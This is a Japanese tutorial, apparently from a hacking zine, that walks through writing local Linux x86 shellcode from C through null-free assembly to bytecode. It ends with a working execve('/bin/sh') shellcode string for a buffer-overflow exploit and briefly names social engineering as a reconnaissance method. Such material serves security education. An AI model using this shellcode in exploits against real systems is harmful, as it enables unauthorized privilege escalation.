x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x

--- 第○章: はじめてのハッキング　〜ローカルシェルコードの開発〜 ---

著者：Defolos

x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x
x0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0xx0xXx0x


■0x01.) はじめに

　前回はバッファオーバフローという脆弱性を利用して権限の奪取を体験しても
らいました。権限奪取はシェルの起動によって行え、それを実現するプログラム
がシェルコードだと述べました。しかし、前回はシェルコードをすでに開発した
ものとして利用しただけでした。そこで、今回はシェルコードをどのようにして
開発するか説明します。
　シェルコードはネットで探せば様々なOSの様々なバージョンに対応した様々な
動作を行うものが公開されています。それらを適宜探してきて利用すれば、確か
にシェルコードの開発などできなくても問題にはなりません。しかし、まったく
知られていないOSを攻撃する場合には自分で開発しなければなりませんし、何よ
り自分で作れる知識があればちょっとした応用が容易になります。


■0x02.) シェルコードとは

　シェルコード（Shell code）はeggとも呼ばれる、シェルを起動するごく小さな
プログラムです。Linuxはシェルによってユーザからの命令をカーネルに伝えると
述べました。ゆえにシェルをroot権限で起動できれば、コンピュータのコントロ
ール権を得られるわけですが、このシェルを起動するコードをシェルコードと呼
びます。

　シェルコードは大きく分けて二つの種類があります。

●ローカルシェルコード

　ローカルつまり同じコンピュータ内での権限奪取に用いられるシェルコードで
す。前回行った侵入のように、同じコンピュータ上でシェルを起動する時に使い
ます。比較的開発しやすく、シェル起動の実現方法も一定になりやすいです。今
回もこちらのローカルシェルコードを開発します。

●リモートシェルコード

　リモートつまりまったく関係の無いコンピュータをネットワークを通して権限
奪取はする時に利用されるシェルコードです。シェルを起動するという基本的な
動作は変わりませんが、ネットワークを介することを前提としています。そのた
め、シェルを起動したシステムからの出力をネットワークに流し、ネットワーク
からの入力をシェルが受け付ける処理を追加します。


■0x03.) 開発手順

　シェルコードを開発する手順は次のように5つのステップに分けられます。

1:アタック対象OSの特定
2:C言語による記述
3:アセンブリ化
4:バイトコードへの変換
5:動作テスト

　これから、この5つのステップについて詳しく確認することにします。


■0x04.) アタック対象OSの特定

　対象となるシステムのOSを特定する方法には種々あります。例として次に3つの
方法を挙げます。それぞれの具体的な方法は多くの良質なドキュメントが公開さ
れていますので、説明をそちらに譲りたいと思います。

1:Telnetで接続してバナーに書かれている情報を信用する
2:nmapなどのポートスキャンツールを利用してポートの空き具合からOSを推察する
3:直接システム管理者に電話をかけて情報を聞き出すソーシャルエンジニアリング

　それでは、なぜアタック対象のOSを知る必要があるのかと言いますと、OSによ
ってシステムコールの仕様が違うからです。システムコールとはWizard Bible v
ol.31でも述べましたが、OSが提供する機能をユーザが利用しやすいようなインタ
フェースとしたものです。Linux、BSD、Solalis、Windowsはそれぞれシステムコ
ールの呼び出し方やシステムコール番号が異なっています。具体的には、Linuxで
はeaxにシステムコール番号、ebx以後にシステムコールへ渡す引数を格納した後
に割り込みを発生させてシステムコールを呼ぶのに対し、BSDではスタックにシス
テムコール番号、引数1、引数2...という順序でデータを格納し、割り込みを発生
させることでシステムコールを呼びます。また、システムコール番号においても
Linuxでシステムコール番号39番はmkdir()であるのに対し、BSDでは同じ39番でも
getppid()に割り当てられています。ゆえにシェルコードを作る際には対象システ
ムがどのOSを使ってるのか知る必要があるのです。


■0x05.) C言語でのプログラム

　シェルコードをC言語で表現すると、第一回で紹介したプログラムに似たプログ
ラムとなります。以前はプログラムを呼び出す関数にexecle()を使いましたが、
今回はexecve()を利用する点で異なります。例を挙げると次のようなプログラムです。

-----　shellcode.c
#include <unistd.h>

void main(int argc, char* argv[]){

    const char *argv[] = {"/bin/sh", '\0'};
    const char *envp[] = '\0';

    execve("/bin/sh", argv, envp);
}
-----

　さて、このプログラムの解説をする前に、ある疑問点を解決しましょう。おそ
らくこのプログラムを見て、「execve()はプログラムを呼び出す関数だというの
はわかったがexecl()と変わりないじゃないか。なんでわざわざexecve()を使うん
だ」という疑問が沸いたことと思います。確かに、関数の骨子は双方とも他プロ
グラムを起動するという点で同じですが、execl()がライブラリ関数であるのに対
して、execve()はシステムコールであるという違いが存在しています。

●ライブラリ関数とシステムコール

　この2つは非常に似た概念であり、混同されがちなのですが、処理レベルに違い
があります。システムコールはOSが用意した機能を呼び出すのに対し、ライブラ
リ関数はシステムコールの組み合わせのような物です。例えばputs()という文字
列を1行出力するライブラリ関数がありますが、この関数の内部ではwriteという
1文字を出力するシステムコールが利用されているのです。writeというのは文字
をディスプレイに出力するのかプリンタに出力するのかを指定しなければいけな
かったり、あらかじめ出力する文字数を指定しなければいけなかったりと面倒臭
いものです。次にputsの実装例の一部を挙げますが、1行表示するだけなのに長い
コードとなってしまっています。

-----
int i;
char *string;

while( *(string+i) != '' || *(string+i) != EOF){
    write(0, *(string+i), 1);
    i++;
}
-----

　しかも、1行をディスプレイに表示するというのはよく使う機能なので、プログ
ラマからするともっと楽にこの機能を使いたいと思うでしょう。そこで、writeの
ような低級の処理をループさせたり、予め決められた定数で呼び出したりして、
1行表示という高度な機能を実現しているわけです。また、ライブラリ関数はOSの
インストール時に先だってコンパイルされ、機械語コードとして保存されている
という点でも相違があります。以前お話したとおり、コンパイルの過程にはリン
クという作業が含まれていました。この時に機械語として保存されているprintf
やputsなどのライブラリ関数を持ってきてひっつけることでまともに動くプログ
ラムが完成するわけですが、このようにあらかじめ機械語にしておくことでコン
パイル時間を大幅に短縮しているのです。
　同様にexecle()という関数も、その内部ではexecve()というシステムコールを
呼び出しています。execle()の場合は、execve()が呼び出したプログラムから制
御が戻ってこない点を解決するために、内部で色々な処理をしています。

●プログラムの動作

　execve()のプロトタイプはManpageを参照すると次のようになっています。

-----
#include <unistd.h>

int execve(const char *filename, char *const argv[], char *const envp[]);
-----

　つまり、第一引数には呼び出すプログラムへのパスを、第二引数には呼び出す
プログラムに渡す引数へのアドレスのアドレスを、第三引数には呼び出すプログ
ラムへ渡す環境変数へのアドレスのアドレスを指定します。今回はシェルを呼び
出すので、プログラムへのパスは「/bin/sh」を指定します。シェルへの引数には、
慣習としてそのプログラム自身の名前を指定することが多いので、ここでもそれ
に習って「/bin/sh」を指定しています。また、環境変数は特に設定する必要は無
いのでNULLを指定します。
　最後にexecve()を実行するわけですが、execve()はプログラムを呼び出したら
それっきり呼び出し元へ制御を返すことはないので、これまでの決まり文句だっ
たreturnはつけなくてもかまいません。


■0x06.) アセンブリ化

　以前、アセンブリでhello worldを表示するプログラムを紹介しましたが、今回
は上のC言語のプログラムをアセンブリで書き直します。アセンブリの基本的な考
え方は前回のレポートで紹介した通りですが、今回はいくつか新しい命令やシス
テムコールが出てきます。

●とりあえずアセンブリ化

　さて、今回はexecve()を利用しますので、/usr/src/linux-2.4.18/include/asm
/unistd.hの中からexecve()を探します。ファイルをアップロードしておきました
のでhttp://ruffnex.oc.to/defolos/text1/hack/unistd.hからダウンロードして
ください。

-----　/usr/src/linux-2.4.18/include/asm/unistd.h
#ifndef _ASM_I386_UNISTD_H_
#define _ASM_I386_UNISTD_H_

/*
 * This file contains the system call numbers.
 */

#define __NR_exit                 1
#define __NR_fork                 2
#define __NR_read                 3
#define __NR_write                4
#define __NR_open                 5
#define __NR_close                6
#define __NR_waitpid              7
#define __NR_creat                8
#define __NR_link                 9
#define __NR_unlink              10
#define __NR_execve              11
#define __NR_chdir               12
...
-----

　システムコール番号は11番だとわかりました。ここで一度、execleも探してみ
てください。たぶん見つからないと思います。実は、アセンブリで前回と同じよ
うな方法で利用できるのは、低レベルな処理を行うシステムコールだけなのです
（printf()などのライブラリ関数は別の方法で利用します）。わざわざexecve()
で同じ動作をするように書き換えた理由はここにあります。

　execve()のシステムコール番号は11ですので、eaxには11を入れればよいことが
わかりました。次に引き数を考えてみましょう。起動したいプログラムへのパス
のアドレスをebxに、文字列へのアドレスのアドレスをecx,edxそれぞれに入れな
ければならないのですが、文字列へのアドレスとかアドレスのアドレスとかは何
でしょうか。ぱっと聞くと違和感のある言葉ですが、次のような状況だと思って
ください。

0x01        0x02        0x03        0x04        0x05
+-----------+-----------+-----------+-----------+-----------+----
| 0x03      |           | 0x05      |           | hello!    |
+-----------+-----------+-----------+-----------+-----------+----
    ↓                     ↑ ↓                     ↑
     ^---------------------^   ^---------------------^

　上図では、0x05番地に「hello!」という文字列が入っています。一方、0x01番
地には「hello!」へのアドレスのアドレスが入っています。「hello!」のアドレ
スは0x03番地に入れられていますが、0x01番地にはその0x03が入れられています。
つまり、0x03番地からみれば、0x03番地には文字列へのアドレスが、0x01番地か
らみれば0x01には文字列へのアドレスのアドレスが入っていることになります。

　今回はebxには文字列へのアドレス、つまり上図の0x03番地のような状況を実現
します。ecxには習慣としてパスと同じものを与えますので、0x01番地のような状
況を実現すれば良いわけです。edxにはNULLを指定すればOKです。先程の図を具体
的なレジスタなどを使って書き直すと次のようになります。

eax            ebx            ecx            edx
+-----------+  +-----------+  +-----------+  +-----------+
| 11        |  | 0x03      |  | 0x01      |  | 00        |
+-----------+  +-----------+  +-----------+  +-----------+


0x01        0x02        0x03        0x04        0x05
+-----------+-----------+-----------+-----------+-----------+----
| 0x03      |           | 0x05      |           | /bin/sh   |
+-----------+-----------+-----------+-----------+-----------+----
    ↓                     ↑ ↓                     ↑
     ^---------------------^   ^---------------------^

　上図のようなことを実現しようとすると、まず文字列が入っている場所のアド
レスを取得してきて、それを0x03番地に格納しなければなりませんね。これには
新しい命令を用いなければなりません。それがlea命令です。

○lea命令

　lea命令はアドレスを取得する命令です。「lea 元のアドレス,格納したい場所
」のように利用します。具体的には「lea 2(%eax), %ebx」のように使います。e
axには「hello!」という文字列へのアドレスが入っているものとします。lea命令
はオフセットが使えますので、この場合、「hello!」の先頭アドレス+2の場所の
アドレスがebxに格納されます。もちろん、eaxには0xffff1021のような数値が入
っていますので、2を足して0xffff1023にしたものを改めてebxに入れてもいいの
ですが、これだと処理が繁雑になってしまいます。アドレスを格納することを明
示的にするためにlea命令を使うべきだと言えます。

○叩き台コード

　引数に何を指定すべきかを説明し、lea命令を知った今、とりあえず「■0x05.)
 C言語でのプログラム」で紹介したプログラムをアセンブリ化することができま
す。次のようなソースが書けると思います。

-----　shellcode_test.s
.data
    msg:  .string "/bin/sh\0"
    addr: .string "AAAA\0"

.text
.globl main
main:
    movl   $11,    %eax
    movl   $msg,   %ebx
    movl   %ebx,   addr
    leal   addr,   %ecx
    movl   $0,     %edx
    int    $0x80
    ret
-----

　ちょっとわかりにくいのは「movl $msg,%ebx、movl %ebx,addr」の部分だと思
います。これは、msgラベルつまり「/bin/sh」の先頭アドレスを取得しebxに格納
します。その後、addrラベルの場所にそのアドレスを書き込みます。その後はed
xをゼロクリアし、割り込みを発生させてexecve()を呼んでいます。
　このソースを機械語に翻訳すれば、確かに動きます。しかし、これはスタンド
アローンにおいて実効可能ではあるのですが、残念ながら私達が目指しているex
ploitへ埋め込んで、プログラムの処理の流れを変えて不正に実行できるようには
なっていないのです。試しに、機械語に翻訳したものを次に掲載します。ちなみ
に文字列データはどこか他の領域に置かれています。

-----
b8 0b 00 00 00 bb 38 95 04 08 89 1d 41 95 04 08 8d 0d 41 95 04 08 ba 00 00 00 00 cd 80 c3
-----

　どのようにして機械語に翻訳するかは次の章で解説しますが、これを前回のEx
ploitにセットして実行しても、おそらくシェルは立ち上がりません。ですので、
これをexploitで利用できるように変更しましょう。

●exploit埋め込み用に書き換え

　現在のところ、問題となる点は2点あります。ひとつは、データセグメントを利
用してしまっていることです。もうひとつは機械語に変換したとき、NULL（16進
数では0x00）が含まれてしまう点です。それでは、この2点について詳しくみてい
きましょう。

○他セグメントを使わないようにする

　Wizard Bible vol.34（http://wizardbible.org/34/34.txt）でメモリは5つの
専門領域に区分されていると述べました。普通のプログラムであれば、手順をテ
キストセグメントに、定数データをデータセグメントに置くのが一般的です。し
かし、シェルコードはスタックセグメントしか利用できません。すなわち、デー
タセグメントに文字列データを格納するようにしてはマズイのです。データをス
タックに置き、どうにかしてそのデータの先頭アドレスを知る必要があります。
　そこで、call/jmpテクニックと呼ばれる手法を用います。callとjmpは処理の流
れを変える命令です。jmpはC言語で言うところのgoto文で、ラベルの場所に処理
を移して戻ってきません。一方、call命令は関数呼び出しに相当します。飛んだ
先の処理が終われば元の位置に戻ってきます。具体的には、call命令はスタック
に次に実行されるはずだったアドレスを積みます。それから制御をラベルのアド
レスに移します。移動先の処理が終われば変数等はスタックから取り除かれるの
で、最上部に先程のアドレスが出てきます。これを次の実行すべきアドレスに設
定すれば、関数呼び出しのような挙動を行うことができるのです。call命令の「
次のアドレスをスタックに積む」というのがキーポイントです。callで飛んだ先
の一番初めの命令でPOPしてやれば、そのアドレスを取得することができますので、
文字列の取得は次のようにして行えます。

-----
main:
    jmp ONE
TWO:
    popl %eax

ONE:
    call TWO
    .string "Hello"
-----

　実行されるといきなりjmp命令でONE:の場所に飛ばされます。その直後にcall命
令でjmp ONEの直後に飛ばされますが、call命令ですのでスタックにはcall自身の
次のアドレス、つまり「Hello」の先頭アドレスが積まれます。callで飛んだ先で
popをしているので、eaxに「Hello」の先頭アドレスが格納されます。

○NULLバイトの除去

　もうひとつの問題はNULLバイトが含まれてしまっている点です。NULLバイトと
は機械語で00と表現される数値のことです（01、40、0fなどの両方が0になってな
いものはNULLバイトではありません）。なぜこれがコード中に存在していると問
題になるのかといいますと、NULLはstrcpy()やgets()などで文字列の終端を表す
特殊な記号として用いられているからです。Wizard Bible vol.36で紹介したよう
に、BOFの脆弱性を突く多くのExploitはstrcpy()を使って、「NOPスレッド、シェ
ルコード、戻りアドレス」から構成される文字列を送り込んでメモリを侵します。

+--------------------+--------------------------+------------+
|  NOP               | shellcode                |  ret       |
+--------------------+--------------------------+------------+

　つまり、シェルコード中にNULLが含まれていると、strcpy()がここまでが文字
列なのだと勘違いしてしまい、シェルコードの残りの部分やretをメモリにコピー
することができなくなってしまうのです。

+--------------------+--------------------------+------------+
|  NOP               | shellcode   ...00...     |  ret       |
+--------------------+--------------------------+------------+
<----------コピーされる領域-----------><---無視される領域--->

　retを書き込むことができないということは、そもそも待避された戻りアドレス
を偽の戻りアドレスで上書きできないということであり、シェルコード自体に制
御が移りません。万が一移ったとしても、シェルコードは途中で終わってしまっ
ているのでexecve()が呼び出されることはありません。結果としてシェルは起動
できずに終わるわけです。
　もちろん、strcpy()などのNULLを文字列の終端と見なすような関数を使わずに
メモリの上書きができれば、NULLをシェルコード中に含めても問題はありません。
例えば、フォーマットストリング攻撃はそういった類の関数を使わないのでNULL
を含めたシェルコードでも問題が起きません。とはいえ、多くのExploitに対応し
たシェルコードを書けば後々の再利用が可能ですので、どうにかしてNULLを消す
ようにがんばりましょう。

・コード中のNULLの除去

　機械語に翻訳した時にNULLが混入する一番の原因は、コード中に利用している
0です。例えば前のコードでは「movl $0,%edx」で0を使っています。数字の0をコ
ードの中に直接書かないようにすれば、この問題は解決します。
　とはいえ、レジスタに0を設定しなくてはシェルコードは作れません。そこで、
「0」という文字を使わないようにしてレジスタをゼロクリアすることを考えまし
ょう。

　これには論理演算を活用します。論理演算の中には排他的論理和（XOR）と呼ば
れるものがあります。この演算の性質を利用することでゼロクリアが可能になり
ます。なお、ここでは論理演算とはなにかについては割愛します。
　XORの演算結果は同じ数値のときには0を、異なる数値の時には1をセットするこ
とで得られます。例えば次のような場合です。

    1110101101000101
xor 1000110111010001
--------------------
    0110011010010100

　つまり、同じ数値同士をXOR演算にかければ0が得られるわけです。

    1110101101000101
xor 1110101101000101
--------------------
    0000000000000000

　アセンブリのコードでは「xorl %eax, %eax」のように記述することでeaxをゼ
ロクリアできます。これでNULLバイトに関するひとつめの問題は解決しました。
実は後もうひとつ、NULLバイトに関して問題が残っています。

・互換レジスタの埋め草問題

　現在、レジスタ容量の主流は32ビットです（64ビットも民間に普及してきまし
たが）。これはレジスタひとつの中に32ビットの情報を記憶できるということで
すが、その昔はレジスタの一般的な容量は16や8ビットでした。システムというの
は後方互換、つまり新しくしたシステムでも昔のものが動くように設計するのが
一般的です。CPUも例に漏れず16や8ビットのレジスタを想定したプログラムも動
くように設計されています。具体的には、32ビットあるレジスタの半分を昔の16
ビットレジスタと認識し、そのまた半分を8ビットレジスタと認識します。
　これまでレジスタへのアクセスには「%eax」というような書き方をしてきまし
たが、eaxというのは32ビットレジスタを表しているのです。eaxを半分にした16
ビットのうち、下位16ビットにアクセスするには「%ax」と指定します。さらにこ
のaxを半分に分けて上位8ビットを「%ah」で、下位8ビットを「%al」でアクセス
します。

32                       16                       0
+------------------------+------------------------+

+----------------------[eax]----------------------+
                         +----------[ax]----------+
                         +----[ah]----+----[al]---+

　さて、今回eaxに格納している11という数値は2進数に直すと1011で、4ビットで
表現可能です。これを32ビットのレジスタに入れようとすると、代入の時に自動
的に先頭28ビットが0で埋められた値に変換されてしまいます。つまり「movl $1011,
 %eax」は勝手に「movl $00000000000000000000000000001011, %eax」という式に
変換されてしまうのです。見るからにNULLバイトがたくさん混入していますね。
ではこれを解決しましょう。

　先程述べました通り、CPUは以前のプログラムと互換性を持つように設計されて
います。axやalの実装がその最もたる例でしたが、この下位互換レジスタを活用
することで埋め草問題は解決します。
　下位互換レジスタの中にalというものがありました。これはeaxの下位8ビット
のことを指しますが、これに11を格納すれば問題は解決します。格納するレジス
タにalを指定した場合は式が自動的に「movb $00001011, %al」というようになり
ます。これでも先頭に0が埋められるのですが、16進数に直すと、前は「00 00 00
 0B」とNULLバイトが3つ出現していたのに対し、今回は「0B」というようにNULL
バイトは出現しません。
　もうひとつ注意点があります。先程の式をよくご覧ください。以前はmovlと書
いていたものが、今回はmovbに変わっています。実はレジスタを操作する命令自
体も下位互換仕様のものが用意されているのです。例えば、axを操作する時には
movの後にwをつけてmovw、ahやalを操作する時にはbをつけてmovbとします。一応、
l,w,bは省略できます。省略すると後のレジスタの種類によって補完されるのです
が、できるだけつけた方がよいでしょう。

●execve()の引き数データ

　前のコードではexecve()への第一引き数と第二引き数を別のアドレスに設定し
ていました。これはスタンドアロン用のプログラムであれば実現できるのですが、
今回のような使用目的には利用できません。そこで「/bin/sh」を確保しているメ
モリの後に続けて第二引数用の文字列を設定します。

    ffffb0          ffffb7
----+---------------+----+--------+----+-------
    | / b i n / s h | 00 | ffffb0 | 00 | 
----+---------------+----+--------+----+-------

　これにはlea命令の所で紹介したオフセットを利用します。オフセットはlea以
外の命令でも使えます。ebxにffffb0が、eaxに0が入っているとすると、「movl 
%eax, 7(%ebx)」はffffb0+7の場所に0を入れるという意味になります。文字列の
終わりには0をいれて置かなければならないので、「/bin/sh」の直後に0を入まし
た。同じように「movl %ebx, 8(%ebx)」とやればffffb0をffffb8の場所に入れる
ことになります。
　ここまでできれば、ebxには文字列のアドレスが入っていますし、ecxにebxの中
のアドレス+8のアドレスをleaで入ればexecve()の引き数が作れます。

●できあがったコード

　以上の問題点を解決したコードのサンプルを次に示します。

-----　shellcode.s
.globl main

main:
    jmp    ONE

TWO:
    popl   %ebx
    xorl   %eax,   %eax
    movl   %eax,   7(%ebx)
    movl   %ebx,   8(%ebx)
    movl   %eax,   12(%ebx)
    movb   $11,    %al
    leal   8(%ebx),   %ecx
    leal   12(%ebx),  %edx
    int    $0x80

ONE:
    call    TWO
    .string "/bin/sh"
-----

　それでは次章以降で、このコードを機械語に変換し、exploitに埋め込んで動作
させて見ましょう。


■0x07.) バイトコードへの変換

　バイトコードは機械語コードのことですが、ソースコードを機械語に変換する
にはコンパイラを用います。アセンブリ言語はアセンブラというソフトで機械語
に変換しますが、以前紹介したgccはアセンブラも兼ねています。先ほどのコード
にshellcode.sという名前をつけた場合には次のようにしてコンパイルします。

-----
defolos@glazheim:~$ gcc shellcode.s
-----

　これでa.outという名前で、先程のコードが機械語になりました。後はこのファ
イルの中身を見れば良いわけですが、catコマンド等ではファイルの中身は文字で
あると扱われるので見ることはできません。機械語としてファイルを閲覧するに
は16進数エディタを用います。次のようにしてobjdumpと言う16進数エディタを利
用します。

-----
defolos@glazheim:~$ objdump -d ./a.out
-----

　かなりたくさん表示されたと思いますが、実際に必要なのは<main>以後90が現
れるまでの間です。ですので次のようにして<main>から30行を表示します。

-----
defolos@glazheim:~$ objdump -d a.out|grep \<main\> -A 30
08048354 <main>:
 8048354:       eb 16                   jmp    804836c <ONE>

08048356 <TWO>:
 8048356:       5b                      pop    %ebx
 8048357:       31 c0                   xor    %eax,%eax
 8048359:       89 43 07                mov    %eax,0x7(%ebx)
 804835c:       89 5b 08                mov    %ebx,0x8(%ebx)
 804835f:       89 43 0c                mov    %eax,0xc(%ebx)
 8048362:       b0 0b                   mov    $0xb,%al
 8048364:       8d 4b 08                lea    0x8(%ebx),%ecx
 8048367:       8d 53 0c                lea    0xc(%ebx),%edx
 804836a:       cd 80                   int    $0x80

0804836c <ONE>:
 804836c:       e8 e5 ff ff ff          call   8048356 <TWO>
 8048371:       2f                      das
 8048372:       62 69 6e                bound  %ebp,0x6e(%ecx)
 8048375:       2f                      das
 8048376:       73 68                   jae    80483e0 <__libc_csu_fini>
...
-----

　真ん中の欄の16進数のところだけを抜き出します。これがバイトコードです。

-----
eb 16 5b 31 c0 89 43 07 89 5b 08 89 43 0c b0 0b 8d 4b 08 8d 53 0c cd 80 e8 e5 ff ff ff 2f 62 69 6e 2f 73 68
-----

　これを前回紹介したExploitのshellcode[]の部分に埋め込みます。C言語では16
進数の前には\xをつけないといけないので、次のようになります。

-----exploit.cの一部
char shellcode[]=
"\xeb\x16\x5b\x31\xc0\x89\x43\x07\x89\x5b\x08\x89\x43\x0c\xb0\x0b\x8d\x4b\x08\x8d\x53\x0c\xcd\x80\xe8\xe5\xff\xff\xff\x2f\x62\x69\x6e\x2f\x73\x68";
-----

　後はこれを前回と同じようにコンパイルして実行すれば、bo-test.exeへ攻撃を
しかけ、このシェルコードが実行されるわけです。


■0x08.) 参考文献

・Chris Anley, John Heasman and Felix Linder. The Shellcoder's Handbook 
Second Edition: Discovering and Exploiting Security Holes. Wiley Publishing,
 2007.

・James C. Foster, Vitaly Osipov and Nish Bhalla. Buffer Overflow Attacks:
 DETECT, EXPLOIT, PREVENT. Syngress Publishing, 2005.

・Jon Erickson著, 村上雅章訳. HACKING:美しき策謀-脆弱性攻撃の理論と実際.
 オライリージャパン, 2005.

・愛甲健二. アセンブリ言語の教科書. データハウス, 2005.

・UNYUN. ハッカー・プログラミング大全. データハウス, 2001.

・GNU アセンブラ入門(GAS),
 http://www.oklab.org/program/assembler/gas.html, (2008年1月3日).


■0x09.) おわりに

　今回はシェルコードの作り方を解説しましたが、30バイト前後の小さなプログ
ラムに様々なハックが詰まっていることをご理解いただけたことと思います。実
はこれでも最も基礎的なシェルコードであって、発展の余地は多く残されている
のです。もう少しシェルコードをインプリメントさせても良いのですが、これは
少し難しくなりますので後回しにしたいと思います。次回は権限奪取が実現され
る脆弱性として、BOFと双璧をなすフォーマットストリング攻撃について解説致し
ます。その後、発展形のシェルコードを作って行きましょう。
　それではまたお会いしましょう。


